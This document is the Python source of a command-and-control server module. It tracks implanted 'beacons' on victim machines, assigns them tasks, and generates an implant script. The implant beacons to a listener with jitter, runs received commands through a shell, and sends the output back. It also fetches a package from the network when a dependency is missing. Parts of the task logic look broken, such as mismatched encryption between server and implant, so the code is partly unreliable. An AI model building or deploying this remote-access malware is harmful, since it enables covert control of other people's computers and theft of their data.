import json
import time
import uuid
import base64
import threading

try:
    from cryptography.fernet import Fernet
    BEACON_KEY = Fernet.generate_key()
    BEACON_CIPHER = Fernet(BEACON_KEY)
    CRYPTO_AVAILABLE = True
except ImportError:
    Fernet = None
    BEACON_KEY = None
    BEACON_CIPHER = None
    CRYPTO_AVAILABLE = False

BEACONS = {}
BEACON_LOCK = threading.Lock()
BEACON_TASKS = {}


def register_beacon(beacon_data):
    if not CRYPTO_AVAILABLE:
        return {"status": "error", "message": "cryptography module not installed. Run: pip install cryptography"}
    beacon_id = str(uuid.uuid4())[:8]
    with BEACON_LOCK:
        BEACONS[beacon_id] = {
            "id": beacon_id,
            "hostname": beacon_data.get("hostname", "Unknown"),
            "os_type": beacon_data.get("os", "Unknown"),
            "username": beacon_data.get("username", "Unknown"),
            "ip": beacon_data.get("ip", "Unknown"),
            "arch": beacon_data.get("arch", "Unknown"),
            "pid": beacon_data.get("pid", 0),
            "first_seen": time.time(),
            "last_seen": time.time(),
            "callbacks": 0,
            "status": "active",
            "tasks": [],
            "results": []
        }
        BEACON_TASKS[beacon_id] = []

    try:
        from handlers.team_server import notify_beacon_checkin
        notify_beacon_checkin(beacon_id, beacon_data.get("hostname", "Unknown"))
    except Exception:
        pass

    return {"status": "success", "beacon_id": beacon_id, "encryption_key": base64.b64encode(BEACON_KEY).decode()}


def beacon_checkin(beacon_id, encrypted_data):
    if not CRYPTO_AVAILABLE:
        return {"status": "error", "message": "cryptography module not installed."}
    with BEACON_LOCK:
        beacon = BEACONS.get(beacon_id)
        if not beacon:
            return {"status": "error", "message": "Unknown beacon."}

        try:
            decrypted = BEACON_CIPHER.decrypt(encrypted_data.encode())
            data = json.loads(decrypted)
        except Exception:
            return {"status": "error", "message": "Decryption failed."}

        beacon["last_seen"] = time.time()
        beacon["callbacks"] += 1
        beacon["status"] = "active"

        if "sysinfo" in data:
            beacon["hostname"] = data["sysinfo"].get("hostname", beacon["hostname"])
            beacon["os_type"] = data["sysinfo"].get("os", beacon["os_type"])
            beacon["username"] = data["sysinfo"].get("username", beacon["username"])
            beacon["ip"] = data["sysinfo"].get("ip", beacon["ip"])

        if "result" in data:
            beacon["results"].append({
                "task_id": data.get("task_id", ""),
                "output": data.get("result", ""),
                "time": time.time()
            })
            if data.get("task_id") in BEACON_TASKS.get(beacon_id, []):
                BEACON_TASKS[beacon_id].remove(data["task_id"])

    pending = []
    with BEACON_LOCK:
        pending = list(BEACON_TASKS.get(beacon_id, [])[:5])

    response = {"status": "ok", "tasks": []}
    if pending:
        response["tasks"] = [{"task_id": t, "command": "system_info"} for t in pending]

    try:
        encrypted_response = BEACON_CIPHER.encrypt(json.dumps(response).encode())
    except Exception:
        encrypted_response = b"{}"

    return {
        "status": "success",
        "response": base64.b64encode(encrypted_response).decode(),
        "pending_tasks": len(pending)
    }


def assign_task(beacon_id, command, task_type="shell"):
    task_id = str(uuid.uuid4())[:6]
    with BEACON_LOCK:
        if beacon_id not in BEACONS:
            return {"status": "error", "message": "Beacon not found."}
        if beacon_id not in BEACON_TASKS:
            BEACON_TASKS[beacon_id] = []
        BEACON_TASKS[beacon_id].append(task_id)
        task = {
            "task_id": task_id,
            "command": command,
            "type": task_type,
            "issued_at": time.time(),
            "status": "pending"
        }
        if "tasks" not in BEACONS[beacon_id]:
            BEACONS[beacon_id]["tasks"] = []
        BEACONS[beacon_id]["tasks"].append(task)
    return {"status": "success", "task_id": task_id, "command": command}


def get_beacons():
    with BEACON_LOCK:
        result = []
        for bid, b in BEACONS.items():
            result.append({
                "id": b["id"],
                "hostname": b["hostname"],
                "os": b.get("os_type", b.get("os", "Unknown")),
                "username": b.get("username", "Unknown"),
                "ip": b.get("ip", "Unknown"),
                "first_seen": b["first_seen"],
                "last_seen": b["last_seen"],
                "callbacks": b["callbacks"],
                "status": b["status"],
                "pending_tasks": len(BEACON_TASKS.get(bid, []))
            })
        return {"status": "success", "beacons": result}


def get_beacon_detail(beacon_id):
    with BEACON_LOCK:
        b = BEACONS.get(beacon_id)
        if not b:
            return {"status": "error", "message": "Beacon not found."}
        return {
            "status": "success",
            "beacon": {
                "id": b["id"],
                "hostname": b["hostname"],
                "os": b.get("os_type", b.get("os", "Unknown")),
                "username": b.get("username", "Unknown"),
                "ip": b.get("ip", "Unknown"),
                "arch": b.get("arch", "Unknown"),
                "pid": b.get("pid", 0),
                "first_seen": b["first_seen"],
                "last_seen": b["last_seen"],
                "callbacks": b["callbacks"],
                "status": b["status"],
                "tasks": b.get("tasks", []),
                "results": b.get("results", [])[-20:]
            }
        }


def remove_beacon(beacon_id):
    with BEACON_LOCK:
        BEACONS.pop(beacon_id, None)
        BEACON_TASKS.pop(beacon_id, None)
    return {"status": "success"}


def generate_beacon_script(listener_url, sleep_sec=5, jitter_pct=30):
    script = f'''
import json, time, base64, uuid, platform, socket, os, subprocess, sys, random
try:
    from cryptography.fernet import Fernet
except ImportError:
    import urllib.request, zipfile, io, tempfile
    tmp = tempfile.mkdtemp()
    urllib.request.urlretrieve("https://files.pythonhosted.org/packages/cryptography/cryptography-41.0.7-cp37-abi3-win_amd64.whl", tmp + "/crypto.whl")
    sys.path.insert(0, tmp + "/crypto.whl")
    from cryptography.fernet import Fernet

BEACON_ID = None
LISTENER = "{listener_url}"
SLEEP = {sleep_sec}
JITTER = {jitter_pct}
KEY = None

def encrypt(data):
    return KEY.encrypt(json.dumps(data).encode()).decode()

def decrypt(data):
    return json.loads(KEY.decrypt(data.encode()))

def sysinfo():
    return {{
        "hostname": platform.node(),
        "os": platform.system() + " " + platform.release(),
        "username": os.environ.get("USER", os.environ.get("USERNAME", "?")),
        "ip": socket.gethostbyname(socket.gethostname()),
        "arch": platform.machine(),
        "pid": os.getpid()
    }}

def register():
    global BEACON_ID, KEY
    try:
        import urllib.request
        data = {{"hostname": platform.node(), "os": platform.system(), "username": os.environ.get("USER", "?"), "ip": socket.gethostbyname(socket.gethostname()), "arch": platform.machine(), "pid": os.getpid()}}
        req = urllib.request.Request(LISTENER + "/register", data=json.dumps(data).encode(), headers={{"Content-Type": "application/json"}})
        resp = json.loads(urllib.request.urlopen(req).read())
        if resp.get("status") == "success":
            BEACON_ID = resp["beacon_id"]
            KEY = Fernet(base64.b64decode(resp["encryption_key"]))
            return True
    except Exception as e:
        pass
    return False

def checkin():
    try:
        import urllib.request
        payload = {{"sysinfo": sysinfo()}}
        enc = encrypt(payload)
        req = urllib.request.Request(LISTENER + "/checkin/" + BEACON_ID, data=enc.encode(), headers={{"Content-Type": "application/octet-stream"}})
        resp = json.loads(urllib.request.urlopen(req).read())
        if resp.get("status") == "success" and resp.get("response"):
            tasks = json.loads(base64.b64decode(resp["response"]).decode())
            for t in tasks.get("tasks", []):
                try:
                    result = subprocess.check_output(t["command"], shell=True, stderr=subprocess.STDOUT, timeout=30).decode(errors="replace")
                    payload2 = {{"task_id": t["task_id"], "result": result}}
                    enc2 = encrypt(payload2)
                    req2 = urllib.request.Request(LISTENER + "/checkin/" + BEACON_ID, data=enc2.encode(), headers={{"Content-Type": "application/octet-stream"}})
                    urllib.request.urlopen(req2).read()
                except Exception:
                    pass
        return True
    except Exception:
        return False

if __name__ == "__main__":
    if register():
        while True:
            checkin()
            jitter = SLEEP + random.uniform(-JITTER/100.0 * SLEEP, JITTER/100.0 * SLEEP)
            time.sleep(max(1, jitter))
    else:
        time.sleep(10)
'''
    return script
